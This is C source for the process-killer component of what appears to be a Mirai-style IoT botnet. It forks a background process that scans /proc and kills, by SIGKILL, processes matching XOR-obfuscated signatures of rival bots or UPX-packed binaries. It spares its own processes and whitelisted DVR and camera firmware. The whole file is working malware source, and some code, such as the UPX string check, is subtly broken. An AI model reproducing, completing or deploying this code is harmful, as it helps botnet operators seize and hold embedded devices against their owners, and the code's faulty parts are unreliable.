#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
//#include <linux/limits.h>
#include <limits.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#include "headers/includes.h"
#include "headers/killer.h"
#include "headers/util.h"
#include "headers/entry.h"

static struct killer_t *start;
static struct killer_t *current;

static struct killer_t *create_killer_list(void)
{
    struct killer_t *ptr = (struct killer_t *)malloc(sizeof(struct killer_t));
    ptr->next = NULL;
    ptr->len = 0;
    start = current = ptr;
}

static void load_process_name(uint16_t len, char *process_to_ignore)
{
    int i = 0;
    uint8_t k1 = XOR_KEY & 0xff, k2 = (XOR_KEY >> 8) & 0xff, k3 = (XOR_KEY >> 16) & 0xff, k4 = (XOR_KEY >> 24) & 0xff;
    struct killer_t *ptr = (struct killer_t *)malloc(sizeof(struct killer_t));

    ptr->len = len;
    ptr->process_to_ignore = (char *)malloc(len);
    util_memcpy(ptr->process_to_ignore, process_to_ignore, len);

    for(i = 0; i < len; i++)
    {
        ptr->process_to_ignore[i] ^= k1;
        ptr->process_to_ignore[i] ^= k2;
        ptr->process_to_ignore[i] ^= k3;
        ptr->process_to_ignore[i] ^= k4;
    }

    #ifdef DEBUG
        //printf("[killer] Loaded process to ignore '%s'\n", ptr->process_to_ignore);
    #endif

    ptr->next = NULL;
    current->next = ptr;
    current = ptr;
}

static int check_process_name(char *str, int pos)
{
    int ret = 0;
    struct killer_t *ptr = start;
    
    while(ptr)
    {
        if(ptr->len == 0)
        {
            ptr = ptr->next;
            continue;
        }
        ret = util_char_search(str, pos, ptr->process_to_ignore, ptr->len);
        if(ret != -1)
            break;
        ptr = ptr->next;
    }

    return ret;
}

static void init_killer_list(void)
{
    create_killer_list();
    // /var/Sofia
    load_process_name(10, "\x28\x71\x66\x75\x28\x54\x68\x61\x6E\x66");
    // /var/Challenge
    load_process_name(14, "\x28\x71\x66\x75\x28\x44\x6F\x66\x6B\x6B\x62\x69\x60\x62");
    // /app/hi3511
    load_process_name(11, "\x28\x66\x77\x77\x28\x6F\x6E\x34\x32\x36\x36");
    // gmDVR
    load_process_name(5, "\x60\x6A\x43\x51\x55");
    // ibox
    load_process_name(4, "\x6E\x65\x68\x7F");
    // /usr/dvr_main _8182T_1108
    load_process_name(25, "\x28\x72\x74\x75\x28\x63\x71\x75\x58\x6A\x66\x6E\x69\x27\x58\x3F\x36\x3F\x35\x53\x58\x36\x36\x37\x3F");
    // /mnt/mtd/app/gui
    load_process_name(16, "\x28\x6A\x69\x73\x28\x6A\x73\x63\x28\x66\x77\x77\x28\x60\x72\x6E");
    // /home/davinci
    load_process_name(13, "\x28\x6F\x68\x6A\x62\x28\x63\x66\x71\x6E\x69\x64\x6E");
    // /var/Kylin
    load_process_name(10, "\x28\x71\x66\x75\x28\x4C\x7E\x6B\x6E\x69");
    // l0 c/udevd
    load_process_name(10, "\x6B\x37\x27\x64\x28\x72\x63\x62\x71\x63");
    // /anko-app/ankosample _8182T_1104
    load_process_name(32, "\x28\x66\x69\x6C\x68\x2A\x66\x77\x77\x28\x66\x69\x6C\x68\x74\x66\x6A\x77\x6B\x62\x27\x58\x3F\x36\x3F\x35\x53\x58\x36\x36\x37\x33");
    // /var/tmp/sonia
    load_process_name(14, "\x28\x71\x66\x75\x28\x73\x6A\x77\x28\x74\x68\x69\x6E\x66");
    // hicore
    load_process_name(6, "\x6F\x6E\x64\x68\x75\x62");
    // stm_hi3511_dvr
    load_process_name(14, "\x74\x73\x6A\x58\x6F\x6E\x34\x32\x36\x36\x58\x63\x71\x75");
    // /bin/busybox
    //load_process_name(12, "\x28\x65\x6E\x69\x28\x65\x72\x74\x7E\x65\x68\x7F");
}

void kill_bad_processes(void)
{
    int killer_highest_pid = KILLER_MIN_PID;
    int last_pid_scan = time(NULL);
    uint32_t scan_counter = 0;

    killer_pid = fork();
    if(killer_pid > 0 || killer_pid == -1)
        return;

    init_killer_list();

    sleep(5);

    while(TRUE)
    {
        DIR *dir;
        struct dirent *file;

        unlock_entry(TABLE_KILLER_PROC);
        if((dir = opendir(retrieve_entry(TABLE_KILLER_PROC))) == NULL)
        {
            break;
        }
        lock_entry(TABLE_KILLER_PROC);

        while((file = readdir(dir)) != NULL)
        {
            if(*(file->d_name) < '0' || *(file->d_name) > '9')
                continue;

            char maps_path[64];
            char *ptr_maps_path = maps_path;
            char real_path[PATH_MAX];
            char exe_path[64];
            char *ptr_exe_path = exe_path;
        	char ret_buf[64];
            int fd = 0;
            int pid = util_atoi(file->d_name, 10);
            int ret = 0;

            scan_counter++;

            if(pid <= killer_highest_pid)
            {
                if(time(NULL) - last_pid_scan > KILLER_RESTART_SCAN_TIME)
                {
                    killer_highest_pid = KILLER_MIN_PID;
                }
                else
                {
                    if(pid > KILLER_MIN_PID && scan_counter % 10 == 0)
                        sleep(1);
                }
                continue;
            }

            if(pid > killer_highest_pid)
                killer_highest_pid = pid;

            last_pid_scan = time(NULL);

            unlock_entry(TABLE_KILLER_PROC);
            unlock_entry(TABLE_KILLER_MAPS);
            unlock_entry(TABLE_KILLER_EXE);

            #ifdef DEBUG
                printf("[killer] Scanning pid %d\n", pid);
            #endif

            ptr_maps_path += util_strcpy(ptr_maps_path, retrieve_entry(TABLE_KILLER_PROC));
            ptr_maps_path += util_strcpy(ptr_maps_path, file->d_name);
            ptr_maps_path += util_strcpy(ptr_maps_path, retrieve_entry(TABLE_KILLER_MAPS));

            ptr_exe_path += util_strcpy(ptr_exe_path, retrieve_entry(TABLE_KILLER_PROC));
            ptr_exe_path += util_strcpy(ptr_exe_path, file->d_name);
            ptr_exe_path += util_strcpy(ptr_exe_path, retrieve_entry(TABLE_KILLER_EXE));

            lock_entry(TABLE_KILLER_PROC);
            lock_entry(TABLE_KILLER_MAPS);
            lock_entry(TABLE_KILLER_EXE);

            if(pid == getpid() || pid == getppid() || pid == main_pid1 || pid == main_pid2 || pid == killer_pid || pid == tel_pid || pid == watch_pid)
            {
                continue;
            }

            ret = check_maps_for_match(maps_path);
            if(ret == -1)
            {
                #ifdef DEBUG
                    printf("[killer] Ignoring process (%s)\n", maps_path);
                #endif
                util_null(maps_path, 0, sizeof(maps_path));
                util_null(exe_path, 0, sizeof(exe_path));
                sleep(1);
                continue;
            }
            else if(ret)
            {
                #ifdef DEBUG
                    printf("[killer] Found bad process (%s), killing it\n", maps_path);
                #else
                    kill(pid, 9);
                #endif
            }

            ret = check_exe_for_match(exe_path);
            if(ret)
            {
                #ifdef DEBUG
                    printf("[killer] Found bad process (%s), killing it\n", exe_path);
                #else
                    kill(pid, 9);
                #endif
            }

            ret = readlink(exe_path, ret_buf, sizeof(ret_buf) - 1);
            if(ret != -1)
            {
                int tfd = -1;

                ret_buf[ret] = 0;

                tfd = open(exe_path, O_RDONLY);
                if(tfd == -1)
                {
                    #ifdef DEBUG
                    	printf("[killer] Deleted binary? (%s), killing it\n", exe_path);
                	#else
                    	kill(pid, 9);
                	#endif
                }
            }

            util_null(maps_path, 0, sizeof(maps_path));
            util_null(exe_path, 0, sizeof(exe_path));

            sleep(1);
        }

        closedir(dir);
    }
}

void kill_killer(void)
{
    kill(killer_pid, 9);
}

static BOOL check_maps_for_match(char *path)
{
    int fd = 0;
    int ret = 0;
    char read_buf[1024];
    BOOL found = FALSE;
    int i = 0;
    char *mirai, *mirai2, *mirai3, *mirai4, *mirai5, *mirai7, *mirai8, *mirai13, *mirai14;
    struct killer_t *ptr;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    unlock_entry(TABLE_KILLER_MIRAI);
    unlock_entry(TABLE_KILLER_MIRAI2);
    unlock_entry(TABLE_KILLER_MIRAI3);
    unlock_entry(TABLE_KILLER_MIRAI4);
    unlock_entry(TABLE_KILLER_MIRAI5);
    unlock_entry(TABLE_KILLER_MIRAI7);
    unlock_entry(TABLE_KILLER_MIRAI8);
    unlock_entry(TABLE_KILLER_MIRAI13);
    unlock_entry(TABLE_KILLER_MIRAI14);

    mirai = retrieve_entry(TABLE_KILLER_MIRAI);
    mirai2 = retrieve_entry(TABLE_KILLER_MIRAI2);
    mirai3 = retrieve_entry(TABLE_KILLER_MIRAI3);
    mirai4 = retrieve_entry(TABLE_KILLER_MIRAI4);
    mirai5 = retrieve_entry(TABLE_KILLER_MIRAI5);
    mirai7 = retrieve_entry(TABLE_KILLER_MIRAI7);
    mirai8 = retrieve_entry(TABLE_KILLER_MIRAI8);
    mirai13 = retrieve_entry(TABLE_KILLER_MIRAI13);
    mirai14 = retrieve_entry(TABLE_KILLER_MIRAI14);

    while((ret = read(fd, read_buf, sizeof(read_buf))) > 0)
    {
        if(check_process_name(read_buf, ret) != -1)
        {
            found = -1;
            break;
        }
        if(util_char_search(read_buf, ret, mirai, util_strlen(mirai)) != -1 ||
           util_char_search(read_buf, ret, mirai2, util_strlen(mirai2)) != -1 ||
           util_char_search(read_buf, ret, mirai3, util_strlen(mirai3)) != -1 ||
           util_char_search(read_buf, ret, mirai4, util_strlen(mirai4)) != -1 ||
           util_char_search(read_buf, ret, mirai5, util_strlen(mirai5)) != -1 ||
           util_char_search(read_buf, ret, mirai7, util_strlen(mirai7)) != -1 ||
           util_char_search(read_buf, ret, mirai8, util_strlen(mirai8)) != -1 ||
           util_char_search(read_buf, ret, mirai13, util_strlen(mirai13)) != -1 ||
           util_char_search(read_buf, ret, mirai14, util_strlen(mirai14)) != -1)
        {
            found = TRUE;
            break;
        }
    }

    lock_entry(TABLE_KILLER_MIRAI);
    lock_entry(TABLE_KILLER_MIRAI2);
    lock_entry(TABLE_KILLER_MIRAI3);
    lock_entry(TABLE_KILLER_MIRAI4);
    lock_entry(TABLE_KILLER_MIRAI5);
    lock_entry(TABLE_KILLER_MIRAI7);
    lock_entry(TABLE_KILLER_MIRAI8);
    lock_entry(TABLE_KILLER_MIRAI13);
    lock_entry(TABLE_KILLER_MIRAI14);

    close(fd);

    return found;
}

static BOOL check_exe_for_match(char *path)
{
    int fd = 0;
    int ret = 0;
    char read_buf[1024];
    char *mirai, *mirai6, *mirai9, *mirai10, *mirai11, *mirai12, *upx;
    BOOL found = FALSE;

    if((fd = open(path, O_RDONLY)) == -1)
        return FALSE;

    unlock_entry(TABLE_KILLER_MIRAI);
    unlock_entry(TABLE_KILLER_MIRAI6);
    unlock_entry(TABLE_KILLER_MIRAI9);
    unlock_entry(TABLE_KILLER_MIRAI10);
    unlock_entry(TABLE_KILLER_MIRAI11);
    unlock_entry(TABLE_KILLER_MIRAI12);
    unlock_entry(TABLE_KILLER_UPX);

    mirai = retrieve_entry(TABLE_KILLER_MIRAI);
    mirai6 = retrieve_entry(TABLE_KILLER_MIRAI6);
    mirai9 = retrieve_entry(TABLE_KILLER_MIRAI9);
    mirai10 = retrieve_entry(TABLE_KILLER_MIRAI10);
    mirai11 = retrieve_entry(TABLE_KILLER_MIRAI11);
    mirai12 = retrieve_entry(TABLE_KILLER_MIRAI12);
    upx = retrieve_entry(TABLE_KILLER_UPX);

    while((ret = read(fd, read_buf, sizeof(read_buf))) > 0)
    {
        if(util_char_search(read_buf, ret, mirai, util_strlen(mirai)) != -1 ||
           util_char_search(read_buf, ret, mirai6, util_strlen(mirai6)) != -1 ||
           util_char_search(read_buf, ret, mirai9, util_strlen(mirai9)) != -1 ||
           util_char_search(read_buf, ret, mirai10, util_strlen(mirai10)) != -1 ||
           util_char_search(read_buf, ret, mirai11, util_strlen(mirai11)) != -1 ||
           util_char_search(read_buf, ret, mirai12, util_strlen(mirai12)) != -1 ||
           util_char_search(read_buf, ret, upx, util_strlen(upx) != -1)
        )
        {
            found = TRUE;
            break;
        }
    }

    lock_entry(TABLE_KILLER_MIRAI);
    lock_entry(TABLE_KILLER_MIRAI6);
    lock_entry(TABLE_KILLER_MIRAI9);
    lock_entry(TABLE_KILLER_MIRAI10);
    lock_entry(TABLE_KILLER_MIRAI11);
    lock_entry(TABLE_KILLER_MIRAI12);
    lock_entry(TABLE_KILLER_UPX);

    close(fd);

    return found;
}
